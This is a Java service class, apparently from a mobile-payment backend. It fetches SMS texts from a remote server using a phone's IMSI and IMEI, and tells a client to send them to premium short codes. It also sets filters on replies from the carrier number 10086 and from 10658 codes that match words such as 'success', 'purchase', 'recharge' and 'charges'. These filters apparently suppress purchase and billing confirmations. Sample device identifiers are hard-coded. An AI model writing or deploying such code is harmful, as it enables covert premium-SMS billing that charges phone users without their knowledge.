package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;

/**
 * 上海依蓝 单机
 * http://182.92.21.219:10789/cmcc/g/single/s2sChargeSMS?pid=xxxx&imsi=xxxx&imei=xxxx&regist=xxxx&version=xxxx&payId=xxx&chargeId=xxx&contentId=xxx&channelId =xxx
 * 
 * @author leoliu
 *
 */
public class ShylDynamicService implements IDynamicService{

	private static final String TYPE = "shyl";
	
	private static final String REQUESTMODEL = "pid={pid}&imsi={imsi}&imei={imei}&regist=0&version=1.0.0.7&payId={payId}&chargeId={chargeId}&contentId={contentId}&channelId={channelId}";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	private static final String SMSDEST0 = "10658422";
	private static final String SMSDEST1 = "1065889923";
	
	private static final Guard guard0 = new Guard("10658","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard2 = new Guard("10658","",960,null,1);
	private static final Guard guard3 = new Guard("10086","",960,null,1);
	
	private int timeOut = 60;
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			String pid = map.get("pid");
			String contentId = map.get("contentId");
			String channelId = map.get("channelId");
			String payId = channel;
			String chargeId = map.get("chargeId");
			
			String requestParam = REQUESTMODEL.replace("{pid}", pid).replace("{imsi}", imsi).replace("{imei}", imei).replace("{payId}", payId).replace("{chargeId}", chargeId).replace("{contentId}", contentId).replace("{channelId}",channelId);
			
			String responseXml = GetData.getData(url, requestParam);
			
			xml = parseXml(responseXml);
			
			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(7,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}

	private String parseXml(String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			String status = SingleXmlUtil.getNodeValue(responseXml, "status");
			
			if(status != null && "0".equals(status)){
				String registSMS = SingleXmlUtil.getNodeValue(responseXml, "registSMS");
				String sms1 = SingleXmlUtil.getNodeValue(registSMS, "SMS");
				
				String chargeSMS = SingleXmlUtil.getNodeValue(responseXml, "chargeSMS");
				String sms2 = SingleXmlUtil.getNodeValue(chargeSMS, "SMS");
				
				if(sms1 != null && sms1.length() > 0 && sms2 != null && sms2.length() > 0){
					try {
						sms1 = CommonUtil.base64Decode(sms1);
						sms2 = CommonUtil.base64Decode(sms2);
					
						StringBuffer sb = new StringBuffer();
						
						Sms sms_1 = new Sms();
						sms_1.setSmsDest(SMSDEST0);
						sms_1.setSmsContent(sms1);
						sms_1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
						
						sb.append(XstreamHelper.toXml(sms_1));
						sb.append("<wait>12</wait>");
						
						Sms sms_2 = new Sms();
						sms_2.setSmsDest(SMSDEST1);
						sms_2.setSmsContent(sms2);
						sms_2.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
						
						List<Guard> guardList = new ArrayList<Guard>();
						
						guardList.add(guard0);
						guardList.add(guard1);
						guardList.add(guard2);
						guardList.add(guard3);
						
						sms_2.setGuardList(guardList);
						
						return sb.append(XstreamHelper.toXml(sms_2)).toString();
					
					} catch (UnsupportedEncodingException e) {
						e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					}
					
				}
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://182.92.21.219:10789/cmcc/g/single/s2sChargeSMS");
		map.put("pid", "2241021504-2248562366");
		map.put("imsi","460028174282753");
		map.put("imei","869460011612203");
		map.put("channel","100001a010000005");
		map.put("chargeId", "006039990023");
		map.put("contentId", "640516015240");
		map.put("channelId", "41084000");
		
		System.out.println(new ShylDynamicService().dynamic(map));
	}
	
}
